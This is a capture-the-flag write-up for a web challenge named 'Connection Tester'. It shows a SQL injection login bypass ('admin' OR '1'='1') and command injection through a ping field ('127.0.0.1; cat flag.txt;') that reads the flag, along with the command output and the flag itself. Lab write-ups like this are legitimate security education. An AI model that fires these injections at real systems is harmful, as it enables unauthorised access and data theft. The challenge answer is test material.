## **Challenge Name: Connection Tester**

### **Description**

Our company threw together an operations dashboard to show to our clients for a demo, but it accidentally got pushed to production. We had some junior developers work on it, so there's probably some rookie mistakes in the application itself.

**Challenge author**: Sid Kumar

**Challenge URL**: `http://18.212.136.134:9080/`

---

### **Approach**

1. **Initial Reconnaissance**  
   - Accessed the login page at the challenge URL
   - Found a login form requiring username and password

2. **Authentication Bypass**  
   - Attempted SQL injection in the login form
   - Used the classic SQL injection payload: `admin' OR '1'='1`
   - Successfully bypassed authentication and gained access to the dashboard

3. **Exploring the Dashboard**  
   - Found a connection tester feature that allows pinging IP addresses
   - Initially tried XSS payloads, which resulted in an error:
     ```
     /bin/sh: 1: Syntax error: "(" unexpected
     ```
   - This error indicated command injection vulnerability

4. **Command Injection Exploitation**  
   - Tested command injection with: `127.0.0.1; ls;`
   - Successfully executed commands and listed directory contents:
     ```
     connecting to 127.0.0.1
     challenge.db
     db.js
     flag.txt
     node_modules
     package-lock.json
     package.json
     scripts
     server.js
     views
     /bin/sh: 1: ...: not found
     ```

5. **Reading the Flag**  
   - Used command injection to read the flag file:
     ```
     127.0.0.1; cat flag.txt;
     ```
   - Successfully extracted the flag

---

### **Flag**

```
PCTF{C0nn3cti0n_S3cured}
```

---

